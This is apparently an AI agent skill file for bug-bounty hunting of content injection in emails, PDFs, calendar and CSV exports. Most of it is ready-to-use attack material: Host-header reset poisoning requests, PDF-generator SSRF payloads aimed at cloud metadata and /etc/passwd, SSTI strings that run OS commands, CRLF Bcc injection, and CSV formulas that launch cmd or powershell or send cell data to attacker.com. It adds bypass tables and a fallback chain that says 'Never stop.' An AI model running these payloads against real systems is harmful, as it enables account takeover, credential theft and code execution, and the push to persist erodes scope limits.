---
name: hunt-content-injection
description: "Use this skill when user input flows into rendered output beyond plain HTML — email templates (password reset, invoices, notifications), PDF generators (invoice/report/ticket PDFs powered by wkhtmltopdf/Puppeteer/Headless Chrome/Prince/Weasyprint), DOCX/XLSX export, SMS templates, push notifications, RSS/Atom feeds. Also load on password reset flows (Host header injection), any feature that constructs a URL from request headers, and signup/profile fields that appear in transactional emails. Only invoke if real impact potential exists — phishing-grade HTML injection in emails, SSRF/file-read via PDF generators, or reset-link poisoning."
type: hunt
---

# Hunt: CONTENT / TEXT INJECTION (EMAIL + PDF + TEMPLATE)

Injection into out-of-band rendering channels: emails, PDFs, documents, push messages. Often overlooked because not in the web response. High payout when chained to phishing, SSRF (via PDF render), or password-reset poisoning.

## Crown Jewel Targets
- Password reset email — Host header / link injection → ATO
- Invoice/receipt PDF — server-side HTML render → SSRF/LFI via `file://`, `http://169.254.169.254/`
- Welcome / verification emails with reflected username — HTML injection → phishing
- Comment notifications with reflected content
- Calendar invites (.ics injection)
- Support ticket auto-replies
- Slack/Teams webhook outputs

## Detection Signals
- Signup/profile field appears verbatim in confirmation email
- `Host:` header changes affect links in emails (password reset, magic link)
- PDF download endpoint with user-controllable content (`/invoice/123.pdf`, `/report?title=...`)
- Headers in PDF response: `Server: wkhtmltopdf`, metadata `Creator: Chromium`, `Producer: Skia/PDF`
- Email template with `{{username}}`, `{{first_name}}` style placeholders (test SSTI)
- `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Original-Host`, `Forwarded:` headers reflected

## Attack Techniques

### 1. Host Header Injection → password reset poisoning
Server builds reset link from `$_SERVER['HTTP_HOST']` or `request.get_host()`.
```http
POST /password-reset HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
Email contains: `https://attacker.com/reset?token=ABCDEF`. Victim clicks → attacker logs token from access log → resets victim password.

Variants:
```
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
X-Host: attacker.com
X-Original-Host: attacker.com
Host: target.com:80@attacker.com         ← userinfo trick
Host: attacker.com
X-Forwarded-Host: target.com             ← dual Host disagreement
```

### 2. HTML injection in emails → phishing-grade
Profile name / signup field reflected in email body without escaping. Most email clients render HTML.
```
Name: <a href="https://attacker.com/login">Click here to verify your account</a>
Name: <h1>SECURITY ALERT</h1><p>Reset your password at <a href=evil>this link</a></p>
Name: <img src='https://attacker.com/track?email=victim'>     ← read-receipt + IP grab
```
Gmail/Outlook strip `<script>` but render `<a>`, `<img>`, `<style>` (limited), `<table>`. Always test in real client.

### 3. SSRF via PDF generator (wkhtmltopdf, Puppeteer, Headless Chrome, Weasyprint)
PDF service renders user-supplied HTML server-side, with full browser network stack.
```html
<iframe src="file:///etc/passwd"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<iframe src="http://169.254.169.254/computeMetadata/v1/?recursive=true&alt=json" -H 'Metadata-Flavor: Google'></iframe>
<iframe src="http://localhost:8500/v1/kv/?recursive"></iframe>            <!-- Consul -->
<iframe src="http://localhost:8161/admin"></iframe>                         <!-- ActiveMQ -->
<img src="file:///etc/passwd">                                              <!-- LFI in wkhtmltopdf <0.12.6 -->
<link rel=stylesheet href="file:///root/.ssh/id_rsa">
<script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(t=>document.body.innerText=t)</script>
<object data="file:///etc/passwd"></object>
<embed src="file:///etc/passwd"/>
```
After render, PDF contains the file content as visible text. wkhtmltopdf `--disable-local-file-access` is the fix — many deployments forget it.

### 4. SSTI in email templates
Jinja2 / Twig / Handlebars / Liquid / Velocity in template engines.
```
Hello {{name}},                  ← test injection in name field
{{7*7}}      → 49 = template eval
{{config}}                       ← Jinja2 dumps config
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.constructor.constructor('return process.env')()}}     ← Node Handlebars
${T(java.lang.Runtime).getRuntime().exec('id')}             ← Spring SpEL
{{<%= 7*7 %>}}                                              ← ERB
```
See hunt-ssti for full payload library.

### 5. Calendar (.ics) injection
```
SUMMARY:Meeting<script>...                  ← rendered in calendar app
LOCATION:http://attacker.com
DESCRIPTION:Visit https://attacker.com for details
ATTENDEE:mailto:victim@target.com;ROLE=CHAIR    ← attendee spoofing
```

### 6. CRLF injection in email headers
Username with `%0d%0a` injects new headers:
```
Subject: Reset%0d%0aBcc: attacker@evil.com%0d%0a
```
Forwards reset email to attacker.

### 7. PDF injection — pure-PDF stream
If app concatenates user input into a PDF object stream, inject `/JS (app.alert('xss'))` for PDF-XSS, or `/Launch` action for filesystem access in some readers.

### 8. CSV injection (Excel/Sheets formula injection)
Export feature dumps user content to CSV. Cell starts with `=`, `+`, `-`, `@`, `\t`, `\r`.
```
=cmd|'/c calc'!A1
=HYPERLINK("http://attacker.com/?d="&A1&A2,"Click here")
=IMPORTXML("http://attacker.com/?d="&A1, "//a")    ← exfil from Google Sheets
@SUM(1+1)*cmd|'/c powershell IEX(...)'!A0
```

## Payloads
```
# Host header reset
Host: attacker.com
X-Forwarded-Host: attacker.com
Host: target.com
X-Forwarded-Host: attacker.com

# Email HTML injection
<h1>You won!</h1><a href=https://attacker.com>Claim</a>
<img src=https://OAST/track?u=victim>
<style>body{background:url(https://OAST)}</style>

# PDF SSRF probes (paste in any "title", "header", "footer", "content" field that ends up in PDF)
<iframe src=file:///etc/passwd></iframe>
<iframe src=http://169.254.169.254/latest/meta-data/></iframe>
<iframe src=http://localhost:80></iframe>
<script>x=new XMLHttpRequest();x.open('GET','file:///etc/passwd',false);x.send();document.write(x.responseText)</script>

# CRLF in email headers
display_name=Attacker%0d%0aBcc:attacker@evil.com%0d%0aX-Injected:1

# CSV injection
=HYPERLINK("https://OAST/?d="&CONCATENATE(A1:Z1))
=cmd|'/c calc'!A1
```

## Bypass Methods
| Filter | Bypass |
|--------|--------|
| Email strips `<a>` | Use `<area href=...>`, `<base href=...>`, autolink (`https://...` plain text Gmail autolinks) |
| Strips `<img src=http` | Use `https`, `data:`, `cid:` (CID schema for inline images often allowed) |
| Sanitizes HTML name field | Test JSON body — sanitization often only on form-encoded; or test API directly |
| PDF gen blocks `file://` | Use `http://localhost/`, `http://127.1/`, `http://[::]/`, IP-decimal `http://2130706433/`, or chain via DNS rebinding |
| `--disable-local-file-access` (wkhtmltopdf) | Still allows HTTP — pivot to internal network SSRF |
| Host header strict-checks | `X-Forwarded-Host`, `Forwarded: host=`, dual-host with one valid |
| CSV blocks `=` prefix | Use `\t=`, `\r=`, `+`, `-`, `@`, formula in middle of cell if quoted-escape weak |

## Tools
```bash
# Host header testing
nuclei -t http/misconfiguration/http-host-header.yaml -u https://target

# PDF generator detection — request a PDF and inspect metadata
curl -s https://target/invoice.pdf -o /tmp/x.pdf
pdfinfo /tmp/x.pdf | grep -E 'Creator|Producer'

# Burp Param Miner — detect reflected headers
# Burp Collaborator for OAST hits from PDF/email rendering

# CSV injection: just open the exported file in Excel/Sheets/LibreOffice with Macros enabled (test env only)
```

## Impact
- **Critical** — SSRF via PDF gen reaches cloud metadata → IAM creds → full account compromise
- **Critical** — Host header reset poisoning → ATO of any user
- **High** — HTML injection in emails delivered to victim inbox → phishing of arbitrary users (program-specific, often paid High)
- **High** — SSTI in email templates → RCE on mail-worker
- **Medium** — CSV injection (most programs accept as Medium, some reject as low — depends on workflow)
- **Low/Info** — Email HTML reflection with no exploit vector

## Chain Potential
- Host header → reset link to attacker → ATO of any account
- PDF SSRF → AWS metadata → IAM creds → S3/RDS access (hunt-cloud-misconfig, hunt-cloud-iam-deep)
- Email HTML injection + open redirect → phishing with target-domain link
- CRLF in email header → BCC exfil of password reset email
- SSTI in template → RCE → lateral to internal network

## Fallback Chain
1. If `Host:` header rewrite is blocked, try `X-Forwarded-Host`, `Forwarded: host=`, `X-HTTP-Host-Override`, or dual `Host` headers — Cache/Origin disagreement.
2. If PDF generator blocks `file://`, try `http://169.254.169.254/`, `http://localhost/`, internal RFC1918 ranges, then DNS rebinding (`http://1u.attacker.com` → 169.254.169.254 after TTL flip).
3. If email sanitizes HTML, test JSON/API direct (often skips email-template sanitizer), test `<base href>` for link redirection, or test SSTI markers (`{{7*7}}`).
4. If everything is hardened, pivot to CSV injection on export endpoints, .ics injection on calendar features, and DOCX/XLSX template injection (formula in custom-properties or shared-strings.xml). Never stop because one technique failed.
